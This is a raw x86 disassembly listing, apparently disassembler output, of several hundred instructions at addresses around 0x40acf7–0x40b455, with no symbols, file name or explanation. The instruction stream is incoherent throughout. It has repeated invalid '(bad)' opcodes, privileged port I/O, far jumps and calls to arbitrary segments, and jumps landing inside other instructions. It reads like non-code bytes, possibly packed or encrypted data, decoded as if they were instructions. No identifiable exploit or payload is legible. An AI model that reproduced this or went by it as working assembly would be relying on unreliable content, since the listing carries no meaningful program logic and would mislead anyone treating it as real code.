  40acf7:	push   0x86742a38
  40acfc:	leave  
  40acfd:	mov    ds:0xf7becdc4,eax
  40ad02:	mov    edi,0x767e5ae3
  40ad07:	fdivr  QWORD PTR [ecx-0x261befea]
  40ad0d:	xchg   esi,eax
  40ad0e:	jge    0x40ad1e
  40ad10:	inc    esi
  40ad11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad12:	les    esi,FWORD PTR [ebx+ebp*4-0x6ba5e05e]
  40ad19:	or     BYTE PTR [ecx],ah
  40ad1b:	or     dl,ah
  40ad1d:	(bad)  
  40ad1e:	xor    edx,ebp
  40ad20:	out    dx,eax
  40ad21:	adc    BYTE PTR [edi],bh
  40ad23:	mul    DWORD PTR [ebp+0x14265bba]
  40ad29:	cmc    
  40ad2a:	sti    
  40ad2b:	xchg   ax,ax
  40ad2d:	lea    edi,[edi-0xf]
  40ad30:	lock in eax,0x4c
  40ad33:	pop    ss
  40ad34:	int3   
  40ad35:	(bad)  
  40ad36:	jmp    0x40ad26
  40ad38:	and    eax,0xb983c3b0
  40ad3d:	test   DWORD PTR [ebp-0x222a7996],esi
  40ad43:	pop    ds
  40ad44:	push   edx
  40ad45:	into   
  40ad46:	cmp    eax,0xa04e687d
  40ad4b:	js     0x40ad72
  40ad4d:	sbb    al,0x84
  40ad4f:	adc    bh,dl
  40ad51:	lahf   
  40ad52:	or     eax,0x3b
  40ad55:	inc    edx
  40ad56:	dec    edi
  40ad57:	out    0xbd,eax
  40ad59:	sbb    BYTE PTR ds:[esi],0xcb
  40ad5d:	dec    edx
  40ad5e:	fadd   st,st(6)
  40ad60:	or     DWORD PTR [edi-0x2a8c271],0xec6cfd90
  40ad6a:	sub    cl,BYTE PTR [eax+0x7a]
  40ad6d:	push   ebp
  40ad6e:	(bad)
  40ad72:	outs   dx,BYTE PTR ds:[esi]
  40ad73:	stc    
  40ad74:	sub    bl,bl
  40ad76:	mov    ecx,0xdd6b827
  40ad7b:	repz popf 
  40ad7d:	xor    al,0xdf
  40ad7f:	addr16 pop edi
  40ad81:	mov    bh,0xde
  40ad83:	(bad)  
  40ad84:	mov    ds:0x8ff87526,eax
  40ad89:	mov    al,ds:0xd9c44197
  40ad8e:	rol    DWORD PTR [ecx-0x16],0x26
  40ad92:	ret    0x8062
  40ad95:	push   ebp
  40ad96:	stos   BYTE PTR es:[edi],al
  40ad97:	dec    esi
  40ad98:	ins    DWORD PTR es:[edi],dx
  40ad99:	xor    BYTE PTR [esi],al
  40ad9b:	xor    bl,BYTE PTR [eax]
  40ad9d:	call   FWORD PTR [ecx]
  40ad9f:	dec    edx
  40ada0:	push   esp
  40ada1:	inc    ebx
  40ada2:	lea    ebp,[eax]
  40ada4:	jmp    0xfa40:0xfb016471
  40adab:	es data16 stos BYTE PTR es:[edi],al
  40adae:	mul    BYTE PTR [ebx]
  40adb0:	sbb    eax,0x7db42d89
  40adb5:	cmc    
  40adb6:	or     ch,ah
  40adb8:	pop    ebp
  40adb9:	and    bh,ah
  40adbb:	das    
  40adbc:	dec    ecx
  40adbd:	in     al,0xfb
  40adbf:	mov    ds:0x112307ea,al
  40adc4:	fs ret 
  40adc6:	inc    esi
  40adc7:	addr16 inc edi
  40adc9:	rcl    DWORD PTR [edi+eiz*1],cl
  40adcc:	ja     0x40add3
  40adce:	add    BYTE PTR [edi+ebp*1-0x7cf1d166],0xdd
  40add6:	push   0xffffff84
  40add8:	rcl    DWORD PTR [ecx+0x75],0x31
  40addc:	es and eax,0xf32310de
  40ade2:	pop    es
  40ade3:	dec    eax
  40ade4:	xchg   esp,eax
  40ade5:	push   ebp
  40ade6:	enter  0x30e1,0x40
  40adea:	jne    0x40ae54
  40adec:	xor    eax,0x81ab39ed
  40adf1:	mov    bl,0x40
  40adf3:	pop    ss
  40adf4:	or     edi,DWORD PTR [edx+0x18]
  40adf7:	push   0x2cdd5469
  40adfc:	add    al,0x47
  40adfe:	cs dec ebp
  40ae00:	out    0x3a,eax
  40ae02:	pop    ecx
  40ae03:	imul   ebp,DWORD PTR [ebx],0x3a
  40ae06:	inc    esp
  40ae07:	or     ecx,ecx
  40ae09:	and    al,0x73
  40ae0b:	mov    BYTE PTR [esi],cl
  40ae0d:	mov    ah,0x1c
  40ae0f:	dec    edi
  40ae10:	and    esi,DWORD PTR [edi-0x1b2af05b]
  40ae16:	push   cs
  40ae17:	aas    
  40ae18:	mov    BYTE PTR [esi-0x30],bl
  40ae1b:	sar    BYTE PTR [edx+0x4af5bfaa],1
  40ae21:	repnz add al,BYTE PTR [esi+0x4f]
  40ae25:	jmp    0x7b125267
  40ae2a:	ffreep st(0)
  40ae2c:	xchg   DWORD PTR [eax-0x1c],ebx
  40ae2f:	retf   0x825d
  40ae32:	cmp    al,0x6c
  40ae34:	or     bl,ah
  40ae36:	push   esi
  40ae37:	sti    
  40ae38:	sub    bl,cl
  40ae3a:	cmp    dl,ch
  40ae3c:	shl    eax,1
  40ae3e:	popf   
  40ae3f:	sbb    eax,0x66d821ab
  40ae44:	rcr    ch,0xbe
  40ae47:	mov    al,ds:0xed33443
  40ae4c:	cs out 0x30,eax
  40ae4f:	mov    BYTE PTR [edx+0x325a3d22],cl
  40ae55:	stc    
  40ae56:	or     BYTE PTR [edi],0xc2
  40ae59:	rcl    DWORD PTR [esi-0x48],1
  40ae5c:	or     eax,0x47d248d6
  40ae61:	xor    edi,eax
  40ae63:	mov    bl,0xdc
  40ae65:	dec    ebp
  40ae66:	cmp    ecx,edx
  40ae68:	inc    ecx
  40ae69:	inc    eax
  40ae6a:	add    DWORD PTR ds:0xd3657e4,edi
  40ae70:	inc    ebp
  40ae71:	xchg   esp,eax
  40ae72:	out    0x92,al
  40ae74:	pop    esp
  40ae75:	aas    
  40ae76:	sahf   
  40ae77:	cmp    eax,0x6557d544
  40ae7c:	push   esp
  40ae7d:	sub    dh,dh
  40ae7f:	jmp    0x90f3:0x9e162e96
  40ae86:	call   0xe6fd:0x7abc0bff
  40ae8d:	jecxz  0x40ae2e
  40ae8f:	mov    bl,0x58
  40ae91:	aam    0x1c
  40ae93:	mov    ch,0xb4
  40ae95:	std    
  40ae96:	dec    ecx
  40ae97:	pop    ebp
  40ae98:	fiadd  WORD PTR [ebp+0x49]
  40ae9b:	pushf  
  40ae9c:	imul   esp,ebp,0xffffff8c
  40ae9f:	mov    al,BYTE PTR [ebp+0x12]
  40aea2:	push   esp
  40aea3:	data16 ins BYTE PTR es:[edi],dx
  40aea5:	push   ss
  40aea6:	inc    ecx
  40aea7:	out    0xb7,eax
  40aea9:	jno    0x40aee6
  40aeab:	xchg   ebx,eax
  40aeac:	add    DWORD PTR [ecx+0x75],edi
  40aeaf:	scas   eax,DWORD PTR es:[edi]
  40aeb0:	retf   0x59ce
  40aeb3:	sbb    eax,0xed14ebdf
  40aeb8:	ror    DWORD PTR [ecx-0x6],0xdf
  40aebc:	call   DWORD PTR [eax+0x4a]
  40aebf:	pop    ebx
  40aec0:	inc    ebp
  40aec1:	mov    edx,DWORD PTR [esi]
  40aec3:	xor    esp,esp
  40aec5:	retf   
  40aec6:	lahf   
  40aec7:	push   0x1c40fc63
  40aecc:	jb     0x40ae5d
  40aece:	out    0x4c,eax
  40aed0:	add    DWORD PTR [ecx],0x3f24666b
  40aed6:	loope  0x40ae78
  40aed8:	xchg   edx,eax
  40aed9:	lods   al,BYTE PTR ds:[esi]
  40aeda:	pop    ds
  40aedb:	aam    0xce
  40aedd:	leave  
  40aede:	fwait
  40aedf:	mov    al,ds:0x539fe91b
  40aee4:	stos   DWORD PTR es:[edi],eax
  40aee5:	ret    0x3632
  40aee8:	add    esi,DWORD PTR [edx-0x38eb1097]
  40aeee:	push   esp
  40aeef:	inc    esp
  40aef0:	inc    edx
  40aef1:	mov    ch,0x9b
  40aef3:	jle    0x40af5d
  40aef5:	jg     0x40aed3
  40aef7:	ret    0x99d
  40aefa:	dec    edi
  40aefb:	enter  0x9253,0xdc
  40aeff:	stos   DWORD PTR es:[edi],eax
  40af00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af01:	les    ebx,FWORD PTR [esi+0x6f076d0]
  40af07:	mov    ebx,ds
  40af09:	pop    eax
  40af0a:	sbb    eax,DWORD PTR [edi-0x716d7678]
  40af10:	mov    ebp,0x4d0a3489
  40af15:	js     0x40af7b
  40af17:	inc    edx
  40af18:	jmp    0x40aee2
  40af1a:	cmp    eax,0x65c04e55
  40af1f:	out    0xc3,al
  40af21:	jbe    0x40af3d
  40af23:	push   ss
  40af24:	or     DWORD PTR [esi-0x39],edx
  40af27:	es into 
  40af29:	retf   0x98d1
  40af2c:	adc    al,0x58
  40af2e:	repnz push eax
  40af30:	push   ds
  40af31:	inc    esp
  40af32:	mov    ebp,0x3a4dd3e3
  40af37:	scas   al,BYTE PTR es:[edi]
  40af38:	out    dx,al
  40af39:	into   
  40af3a:	pop    ebp
  40af3b:	int3   
  40af3c:	dec    esi
  40af3d:	loopne 0x40af93
  40af3f:	push   esp
  40af40:	(bad)  
  40af41:	int    0x3f
  40af43:	ja     0x40afb9
  40af45:	fs in  eax,dx
  40af47:	test   DWORD PTR [eax-0x29],esp
  40af4a:	or     bh,BYTE PTR [ecx]
  40af4c:	xchg   esi,eax
  40af4d:	dec    eax
  40af4e:	xchg   ecx,eax
  40af4f:	in     al,0x7
  40af51:	lds    edx,FWORD PTR [edx-0x2ae07851]
  40af57:	mov    bl,0x95
  40af59:	aaa    
  40af5a:	adc    bh,dl
  40af5c:	mov    edi,0x966fbebe
  40af61:	fmul   DWORD PTR [ecx+ebp*4+0x57]
  40af65:	adc    ebp,DWORD PTR [ebx]
  40af67:	xchg   esp,eax
  40af68:	bound  eax,QWORD PTR [esi]
  40af6a:	jae    0x40af96
  40af6c:	int    0xcf
  40af6e:	gs inc edi
  40af70:	hlt    
  40af71:	fs je  0x40af08
  40af74:	(bad)  
  40af75:	in     eax,0x2f
  40af77:	emms   
  40af79:	cs jnp 0x40afd3
  40af7c:	sub    eax,0xbc488ba2
  40af81:	lods   al,BYTE PTR ds:[esi]
  40af82:	clc    
  40af83:	test   DWORD PTR [esi],eax
  40af85:	arpl   WORD PTR [edi+0x25bba12d],ax
  40af8b:	xor    eax,DWORD PTR [ebp-0x70]
  40af8e:	jg     0x40afcd
  40af90:	mov    bh,0xa9
  40af92:	aaa    
  40af93:	inc    eax
  40af94:	mov    esi,0xbf7308d3
  40af99:	fadd   st,st(3)
  40af9b:	popf   
  40af9c:	in     al,0x6f
  40af9e:	clc    
  40af9f:	mov    ecx,DWORD PTR [edx+0x11f1895a]
  40afa5:	mov    bh,0xc2
  40afa7:	jnp    0x40affe
  40afa9:	in     al,0xcc
  40afab:	mov    al,ch
  40afad:	xchg   ebp,eax
  40afae:	mov    ds:0x3c856b18,eax
  40afb3:	jno    0x40af99
  40afb5:	sub    al,BYTE PTR [ecx+0x3065b5ba]
  40afbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afbc:	inc    eax
  40afbd:	adc    DWORD PTR [edx-0x36],ebp
  40afc0:	push   ss
  40afc1:	or     eax,0x8b4dbc0d
  40afc6:	cwde   
  40afc7:	mov    ecx,0x7cce968f
  40afcc:	xchg   edi,eax
  40afcd:	ret    
  40afce:	add    DWORD PTR [edi+eiz*1-0x47],edx
  40afd2:	ret    
  40afd3:	inc    edi
  40afd4:	cwde   
  40afd5:	pop    esi
  40afd6:	sbb    BYTE PTR [edi-0xb],cl
  40afd9:	scas   al,BYTE PTR es:[edi]
  40afda:	sbb    DWORD PTR [esi],esp
  40afdc:	mov    ss,ecx
  40afde:	sub    ebx,edi
  40afe0:	and    BYTE PTR ds:0x2ab17fae,dl
  40afe6:	sub    DWORD PTR [esi-0x6afcc66d],ebp
  40afec:	pop    ebp
  40afed:	add    ch,al
  40afef:	jge    0x40b03c
  40aff1:	js     0x40afc0
  40aff3:	add    ch,BYTE PTR [ecx-0x4a3a3ffc]
  40aff9:	outs   dx,BYTE PTR ds:[esi]
  40affa:	out    0x8c,al
  40affc:	rol    BYTE PTR [ebx],1
  40affe:	stc    
  40afff:	jle    0x40af8a
  40b001:	loope  0x40b02c
  40b003:	add    eax,DWORD PTR [ebx-0x63]
  40b006:	cmc    
  40b007:	sub    BYTE PTR [ebp+0x46],ch
  40b00a:	fcmovu st,st(2)
  40b00c:	sub    eax,0x6b8ddf51
  40b011:	xchg   ebx,ebp
  40b013:	mov    edx,0x497da949
  40b018:	in     al,dx
  40b019:	and    al,BYTE PTR ds:0x5a8392d7
  40b01f:	data16 sub al,0x36
  40b022:	add    DWORD PTR [eax],eax
  40b024:	jecxz  0x40b064
  40b026:	inc    ebp
  40b027:	popf   
  40b028:	(bad)  
  40b029:	outs   dx,BYTE PTR ds:[esi]
  40b02a:	rcr    BYTE PTR [edi+edi*4],0x35
  40b02e:	repnz pop ebx
  40b030:	xchg   esp,eax
  40b031:	cli    
  40b032:	sbb    DWORD PTR [esi+edi*1+0x36],ebp
  40b036:	lock (bad) 
  40b038:	or     eax,0xbfff6304
  40b03d:	not    BYTE PTR [ecx]
  40b03f:	jnp    0x40afd3
  40b041:	daa    
  40b042:	jg     0x40b0c3
  40b044:	ret    0x7d46
  40b047:	mov    es,ebp
  40b049:	dec    eax
  40b04a:	cdq    
  40b04b:	shl    BYTE PTR [edi],cl
  40b04d:	mov    dl,0x93
  40b04f:	push   eax
  40b050:	xor    eax,0xa7083752
  40b055:	pop    edx
  40b056:	icebp  
  40b057:	xor    DWORD PTR [ebx],esi
  40b059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b05a:	jp     0x40b024
  40b05c:	ss ins BYTE PTR es:[edi],dx
  40b05e:	cmp    eax,0x8db35307
  40b063:	cld    
  40b064:	sub    al,0x17
  40b066:	sbb    eax,0x82b9ab90
  40b06b:	shl    eax,cl
  40b06d:	mov    BYTE PTR [eax+0x77],cl
  40b070:	jno    0x40b0a6
  40b072:	inc    edx
  40b073:	jge    0x40b00b
  40b075:	loope  0x40b055
  40b077:	out    dx,al
  40b078:	fild   QWORD PTR [eax-0x4b]
  40b07b:	cmp    bl,BYTE PTR ds:0x87b25d5f
  40b081:	and    eax,0xb9b2cba0
  40b086:	push   esi
  40b087:	adc    BYTE PTR [esi+0x237183d4],al
  40b08d:	mov    dh,0xd0
  40b08f:	lds    esi,FWORD PTR [esi]
  40b091:	dec    esi
  40b092:	bound  esi,QWORD PTR [ebx]
  40b094:	loopne 0x40b10e
  40b096:	add    DWORD PTR [ebx],ebp
  40b098:	dec    esi
  40b099:	repnz retf 0xa915
  40b09d:	push   ss
  40b09e:	push   ecx
  40b09f:	aam    0x95
  40b0a1:	lds    esi,FWORD PTR [eax+ebp*8+0xde01a66]
  40b0a8:	call   0x419d:0xea286b9c
  40b0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0b0:	push   ebx
  40b0b1:	in     al,dx
  40b0b2:	mov    al,ds:0xa220eaa
  40b0b7:	jge    0x40b0b4
  40b0b9:	das    
  40b0ba:	fmul   st(2),st
  40b0bc:	stos   BYTE PTR es:[edi],al
  40b0bd:	and    ebp,edx
  40b0bf:	pop    es
  40b0c0:	and    eax,0x43052d99
  40b0c5:	js     0x40b0b5
  40b0c7:	mov    WORD PTR [esi*2-0x79554fc],fs
  40b0ce:	addr16 xchg edi,eax
  40b0d0:	jnp    0x40b0be
  40b0d2:	icebp  
  40b0d3:	outs   dx,DWORD PTR ds:[esi]
  40b0d4:	sbb    DWORD PTR [ecx+0x3a],eax
  40b0d7:	jbe    0x40b070
  40b0d9:	inc    ebp
  40b0da:	xchg   ebp,eax
  40b0db:	ss (bad) 
  40b0dd:	rcr    DWORD PTR [ebp+0x1463e292],cl
  40b0e3:	jmp    0xf20e88bd
  40b0e8:	cli    
  40b0e9:	sbb    cl,ah
  40b0eb:	lahf   
  40b0ec:	in     al,0x6e
  40b0ee:	xchg   BYTE PTR [ecx+0xf59f8e6],ah
  40b0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f5:	leave  
  40b0f6:	dec    esi
  40b0f7:	fdivr  st(1),st
  40b0f9:	(bad)  
  40b0fa:	jg     0x40b169
  40b0fc:	das    
  40b0fd:	xor    ecx,DWORD PTR [edi]
  40b0ff:	mov    ah,0xd1
  40b101:	add    al,0xf0
  40b103:	push   edx
  40b104:	xor    eax,0xddf7f675
  40b109:	ins    DWORD PTR es:[edi],dx
  40b10a:	ss dec eax
  40b10c:	ficom  WORD PTR [edx]
  40b10e:	xor    DWORD PTR [edi-0x6b26ffb5],ebp
  40b114:	jne    0x40b0fa
  40b116:	ror    ecx,cl
  40b118:	in     al,dx
  40b119:	xlat   BYTE PTR ds:[ebx]
  40b11a:	js     0x40b167
  40b11c:	mov    eax,ds:0x90f5c677
  40b121:	int    0xe1
  40b123:	cmp    dh,BYTE PTR [edi+0x2a]
  40b126:	dec    ebp
  40b127:	sub    eax,0x351e2fdd
  40b12c:	(bad)  
  40b12d:	dec    esi
  40b12e:	loopne 0x40b0c7
  40b130:	xchg   esi,eax
  40b131:	dec    esp
  40b132:	xor    esp,DWORD PTR [edx-0x48]
  40b135:	popf   
  40b136:	mov    dh,0xaa
  40b138:	cmp    ebp,DWORD PTR [ebx]
  40b13a:	jmp    0x40b0e7
  40b13c:	frstor [ebp*8+0x60fc4675]
  40b143:	xor    ch,ah
  40b145:	sbb    al,dh
  40b147:	add    eax,0xb4ee83f2
  40b14c:	jmp    0xc286dcb9
  40b151:	hlt    
  40b152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b153:	push   ebx
  40b154:	popa   
  40b155:	adc    eax,0x572f9b02
  40b15a:	pusha  
  40b15b:	clc    
  40b15c:	aas    
  40b15d:	xchg   dl,al
  40b15f:	mov    ch,0xbc
  40b161:	retf   0xacab
  40b164:	mov    eax,ebp
  40b166:	mov    edx,0xe3a46ba6
  40b16b:	push   0x45
  40b16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b16e:	das    
  40b16f:	push   0xffffffab
  40b171:	loope  0x40b1bc
  40b173:	and    al,0x1c
  40b175:	inc    ecx
  40b176:	inc    edi
  40b177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b178:	pop    eax
  40b179:	aad    0x98
  40b17b:	sub    eax,0x123919ff
  40b180:	lds    esi,FWORD PTR [esi-0x565d2c8c]
  40b186:	and    dh,BYTE PTR [ebp-0x51ea9c2a]
  40b18c:	inc    ecx
  40b18d:	outs   dx,DWORD PTR ds:[esi]
  40b18e:	call   0x4b51:0x824d723e
  40b195:	xor    cl,dh
  40b197:	aaa    
  40b198:	lea    esp,[edi+0x1f6ee312]
  40b19e:	(bad)  
  40b19f:	gs jne 0x40b1df
  40b1a2:	outs   dx,BYTE PTR ds:[esi]
  40b1a3:	sbb    cl,BYTE PTR [eax+0x2a3fc58d]
  40b1a9:	jbe    0x40b1fa
  40b1ab:	imul   eax,DWORD PTR [ecx-0x7b],0xffffffd0
  40b1af:	rcl    BYTE PTR [esi],0x24
  40b1b2:	outs   dx,BYTE PTR ds:[esi]
  40b1b3:	jp     0x40b1f2
  40b1b5:	xchg   ecx,eax
  40b1b6:	or     dh,BYTE PTR [esi]
  40b1b8:	jo     0x40b1c5
  40b1ba:	das    
  40b1bb:	and    ah,BYTE PTR [esi]
  40b1bd:	dec    esi
  40b1be:	adc    ch,dl
  40b1c0:	clc    
  40b1c1:	and    BYTE PTR [edx+0x2c],cl
  40b1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c5:	(bad)  [edx-0x43]
  40b1c8:	sub    BYTE PTR [eax+0x5c15c500],al
  40b1ce:	mov    edi,0xd272ff76
  40b1d3:	pop    edx
  40b1d4:	push   esi
  40b1d5:	jbe    0x40b249
  40b1d7:	sub    BYTE PTR [eax+eax*4],bl
  40b1da:	iret   
  40b1db:	mov    esi,0xb98a4cd0
  40b1e0:	dec    ebp
  40b1e1:	fwait
  40b1e2:	sahf   
  40b1e3:	xchg   esi,eax
  40b1e4:	lods   eax,DWORD PTR ds:[esi]
  40b1e5:	sbb    edi,DWORD PTR [ebx+0x38]
  40b1e8:	inc    esp
  40b1e9:	in     eax,0x9a
  40b1eb:	fcomp  QWORD PTR [edx+0x35376917]
  40b1f1:	sub    BYTE PTR [esi+0x375c2c60],0x52
  40b1f8:	aad    0x79
  40b1fa:	aad    0x7d
  40b1fc:	sbb    DWORD PTR [ecx-0x4a],edi
  40b1ff:	push   edi
  40b200:	pop    edi
  40b201:	jmp    0x3cfa:0x7bc4de38
  40b208:	mov    ebp,0xd02b596b
  40b20d:	retf   0xcd77
  40b210:	mov    dh,0x8e
  40b212:	cli    
  40b213:	or     esp,eax
  40b215:	inc    esp
  40b216:	sbb    dh,0x61
  40b219:	jb     0x40b215
  40b21b:	outs   dx,BYTE PTR ds:[esi]
  40b21c:	push   edx
  40b21d:	push   es
  40b21e:	push   0xffffffcf
  40b220:	sub    eax,0x73610fa5
  40b225:	push   ecx
  40b226:	stc    
  40b227:	pop    es
  40b228:	mov    esi,0xbc2d50c2
  40b22d:	add    DWORD PTR [ebx+eiz*1],esp
  40b230:	cmp    BYTE PTR [eax+ebx*1],dl
  40b233:	add    al,0x7a
  40b235:	(bad)  
  40b237:	loop   0x40b269
  40b239:	dec    esp
  40b23a:	ret    0x47ee
  40b23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b23e:	xlat   BYTE PTR ds:[ebx]
  40b23f:	shl    DWORD PTR [edx],1
  40b241:	ret    0xf345
  40b244:	xchg   esp,eax
  40b245:	inc    edi
  40b246:	stos   DWORD PTR es:[edi],eax
  40b247:	mov    dh,0x9a
  40b249:	sar    BYTE PTR [eax+0x30ce9b05],1
  40b24f:	out    dx,eax
  40b250:	inc    ebp
  40b251:	mov    dl,0xf1
  40b253:	mov    ch,0x9c
  40b255:	or     al,0xd1
  40b257:	pop    ds
  40b258:	cmp    ebx,0x67a73b60
  40b25e:	mov    ebp,0x6cec1df0
  40b263:	fwait
  40b264:	push   esi
  40b265:	ror    ch,cl
  40b267:	push   cs
  40b268:	rcr    DWORD PTR [ebx+0x26],0xcd
  40b26c:	xor    cl,BYTE PTR [eax]
  40b26e:	dec    eax
  40b26f:	pop    ds
  40b270:	xchg   edi,eax
  40b271:	mov    esi,0x2c4c416f
  40b276:	fidiv  WORD PTR [ebp-0x5e9b5c4a]
  40b27c:	xor    al,0x34
  40b27e:	stc    
  40b27f:	push   ecx
  40b280:	push   esp
  40b281:	mov    al,ds:0x93e6c687
  40b286:	and    eax,0x3b4c21a
  40b28b:	sub    al,0x35
  40b28d:	xlat   BYTE PTR ds:[ebx]
  40b28e:	mov    edx,0x4dd00554
  40b293:	loopne 0x40b2c9
  40b295:	jnp    0x40b26a
  40b297:	jo     0x40b306
  40b299:	or     bl,dl
  40b29b:	jno    0x40b2f5
  40b29d:	pop    esi
  40b29e:	std    
  40b29f:	push   esi
  40b2a0:	ret    0xe5d2
  40b2a3:	push   cs
  40b2a4:	jbe    0x40b28f
  40b2a6:	mov    al,0xa9
  40b2a8:	lods   al,BYTE PTR ds:[esi]
  40b2a9:	fisub  WORD PTR ds:0xe23147fb
  40b2af:	add    bh,BYTE PTR [eax+ecx*1+0x34bfe625]
  40b2b6:	cmp    ch,BYTE PTR [edx]
  40b2b8:	pop    esi
  40b2b9:	(bad)  [ecx-0x69d83d3c]
  40b2bf:	cwde   
  40b2c0:	xchg   ecx,eax
  40b2c1:	dec    DWORD PTR [edi-0x4e5ceec8]
  40b2c7:	pop    ds
  40b2c8:	addr16 retf 0xf84b
  40b2cc:	add    ecx,DWORD PTR [eax]
  40b2ce:	jecxz  0x40b2a1
  40b2d0:	dec    edi
  40b2d1:	mov    WORD PTR [ecx+0x28033acb],cs
  40b2d7:	add    edi,DWORD PTR ds:0x15e3fe66
  40b2dd:	mov    ecx,0x7e8968eb
  40b2e2:	clc    
  40b2e3:	imul   edi,edi,0xd5804e
  40b2e9:	out    dx,eax
  40b2ea:	pop    eax
  40b2eb:	jge    0x40b2ed
  40b2ed:	adc    dh,BYTE PTR [eax+0x3160fd60]
  40b2f3:	cmc    
  40b2f4:	pop    ss
  40b2f5:	and    ch,dh
  40b2f7:	push   esp
  40b2f8:	cli    
  40b2f9:	mov    cl,0xd0
  40b2fb:	cld    
  40b2fc:	lahf   
  40b2fd:	sub    DWORD PTR [esi-0x7c],esp
  40b300:	pushf  
  40b301:	cmp    bl,BYTE PTR [esi]
  40b303:	sub    al,bl
  40b305:	pop    ecx
  40b306:	inc    ecx
  40b307:	cwde   
  40b308:	int    0x98
  40b30a:	xor    edi,edi
  40b30c:	aas    
  40b30d:	and    BYTE PTR [esi+0x3f725b7b],al
  40b313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b314:	dec    edi
  40b315:	and    eax,0x761afa4d
  40b31a:	dec    eax
  40b31b:	xlat   BYTE PTR ds:[ebx]
  40b31c:	nop
  40b31d:	out    0xfb,eax
  40b31f:	(bad)  
  40b320:	repnz push edi
  40b322:	in     eax,0xc8
  40b324:	mov    esp,0x4ab90b7
  40b329:	imul   ebx,DWORD PTR [ebx-0x7b],0x27a4263
  40b330:	adc    WORD PTR ds:0xfc467902,0xf5a7
  40b339:	and    BYTE PTR [ebx],ch
  40b33b:	(bad)  
  40b33d:	mov    dl,0xc8
  40b33f:	mov    esi,0xf9ee2799
  40b344:	mov    bh,0x94
  40b346:	xor    BYTE PTR [ebx],dl
  40b348:	aas    
  40b349:	and    eax,0xcb321489
  40b34e:	stos   BYTE PTR es:[edi],al
  40b34f:	call   0x35d9:0xcb9eafe1
  40b356:	sbb    al,0xf0
  40b358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b359:	shl    ch,cl
  40b35b:	bound  ebx,QWORD PTR [esi+0x12]
  40b35e:	imul   ecx,esi,0xffffff8c
  40b361:	xor    edi,esp
  40b363:	xchg   edi,eax
  40b364:	inc    esi
  40b365:	fcomp  st(1)
  40b367:	xor    bl,BYTE PTR [edx+0x72]
  40b36a:	or     BYTE PTR [edx],ch
  40b36c:	lahf   
  40b36d:	dec    ebx
  40b36e:	push   edx
  40b36f:	xchg   BYTE PTR [esi-0x6386d630],ch
  40b375:	jg     0x40b383
  40b377:	cmp    esi,DWORD PTR [esi+eiz*2-0x41]
  40b37b:	mov    BYTE PTR [edx+0x4],ah
  40b37e:	adc    al,BYTE PTR [ecx-0x53f8a585]
  40b384:	mov    bh,0xaa
  40b386:	jle    0x40b34b
  40b388:	(bad)  [ebp-0x74df76df]
  40b38e:	or     al,dl
  40b390:	sahf   
  40b391:	pop    edi
  40b392:	sbb    eax,0xdcd2c85f
  40b397:	inc    ecx
  40b398:	lods   eax,DWORD PTR ds:[esi]
  40b399:	hlt    
  40b39a:	cmp    al,0xcd
  40b39c:	mov    DWORD PTR [edx+edi*4+0x29b3f174],ebp
  40b3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a4:	ins    DWORD PTR es:[edi],dx
  40b3a5:	call   0x59d:0x47166ad5
  40b3ac:	sar    bh,1
  40b3ae:	lods   al,BYTE PTR ds:[esi]
  40b3af:	cmp    ah,bl
  40b3b1:	mov    BYTE PTR [ecx+ecx*1-0x47],ch
  40b3b5:	(bad)
  40b3b8:	lock call 0x570fa130
  40b3be:	fcmovnu st,st(5)
  40b3c0:	dec    ecx
  40b3c1:	ret    0x2557
  40b3c4:	loopne 0x40b425
  40b3c6:	inc    esp
  40b3c7:	push   edi
  40b3c8:	jo     0x40b3fa
  40b3ca:	dec    ebp
  40b3cc:	mov    al,ds:0xa7da4ccc
  40b3d1:	js     0x40b35b
  40b3d3:	xchg   edi,eax
  40b3d4:	lea    esi,ds:0x7fb5509e
  40b3da:	mov    ah,0xa8
  40b3dc:	cld    
  40b3dd:	or     esi,edi
  40b3df:	cld    
  40b3e0:	sti    
  40b3e1:	jae    0x40b41d
  40b3e3:	xchg   edi,eax
  40b3e4:	out    dx,eax
  40b3e5:	iret   
  40b3e6:	push   eax
  40b3e7:	adc    DWORD PTR [ebx],ebx
  40b3e9:	mov    edi,0x6b145027
  40b3ee:	mov    ebp,0xeff8784a
  40b3f3:	xor    al,0x18
  40b3f5:	sub    ch,BYTE PTR ds:0xdf5027fd
  40b3fb:	and    eax,0xc4cd664f
  40b400:	pop    ebx
  40b401:	push   cs
  40b402:	xor    al,0x89
  40b404:	xchg   ebx,eax
  40b405:	in     eax,0x53
  40b407:	mov    ch,0x4
  40b409:	xchg   BYTE PTR [ecx+ebp*8],ch
  40b40c:	xor    ecx,DWORD PTR [eax+ebx*8-0x554d012d]
  40b413:	push   ebp
  40b414:	xlat   BYTE PTR ds:[ebx]
  40b415:	adc    al,0x23
  40b417:	hlt    
  40b418:	fstp   QWORD PTR [edi+0x51]
  40b41b:	iret   
  40b41c:	mov    bh,BYTE PTR [ebx-0xb]
  40b41f:	inc    eax
  40b420:	sbb    DWORD PTR [edx],edx
  40b422:	shl    DWORD PTR [ebx+0x5a946db],1
  40b428:	in     eax,dx
  40b429:	fmul   st(0),st
  40b42b:	add    eax,0xe82f9bae
  40b430:	jmp    0xa846:0x2adaaad3
  40b437:	pop    es
  40b438:	cmc    
  40b439:	das    
  40b43a:	xlat   BYTE PTR ds:[ebx]
  40b43b:	fldcw  WORD PTR ds:0xdf9a2530
  40b441:	jo     0x40b486
  40b443:	lods   al,BYTE PTR ds:[esi]
  40b444:	rcr    DWORD PTR [eax-0x855fcbe],cl
  40b44a:	sbb    eax,0x471ce723
  40b44f:	cmc    
  40b450:	mov    ds:0x8b03ecd1,al
  40b455:	or     ebp,0x70b79ab0
